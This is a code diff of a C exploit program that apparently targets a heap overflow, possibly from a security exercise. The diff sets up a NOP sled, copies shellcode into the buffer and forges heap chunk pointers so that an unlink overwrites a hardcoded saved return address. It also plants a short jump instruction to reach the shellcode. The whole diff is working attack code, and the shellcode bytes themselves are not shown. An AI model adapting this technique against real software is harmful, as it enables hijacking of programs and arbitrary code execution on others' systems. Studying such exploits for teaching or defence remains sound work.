@@ -48,6 +48,7 @@ typedef union CHUNK_TAG
 
 #define PPOINTER 0x8059878 
 #define QPOINTER 0x8059948 
+#define EIP      0xbffffa7c
 
 int main(void)
 {
@@ -56,17 +57,19 @@ int main(void)
   char buf[1024];
 
   memset(buf, 0x90, 1024);
-  strncpy(buf+972, shellcode, 45);
+  strncpy(buf+800, shellcode, 45);
   //strncpy(buf+244, "\x12\x34\x56\x78", 4);
 
   void *vp = (void*)buf + (QPOINTER - PPOINTER);
   CHUNK *p = TOCHUNK(vp);
 
-  p->s.l = (void*)QPOINTER-sizeof(CHUNK)-sizeof(CHUNK);
-  p->s.r = (void*)QPOINTER; 
+  p->s.l = (void*)QPOINTER+0x100; 
+  p->s.r = (void*)EIP;
 
-  CHUNK *l = TOCHUNK(vp-sizeof(CHUNK));
-  CHUNK *r = TOCHUNK(vp+sizeof(CHUNK));
+  CHUNK *l = TOCHUNK(vp+sizeof(CHUNK)+0x100);
+  CHUNK *r = TOCHUNK(vp-sizeof(CHUNK));
+
+  strncpy((char*)l+2, "\xeb\x0c", 2);
   
   SET_FREEBIT(l);
   //SET_FREEBIT(r);
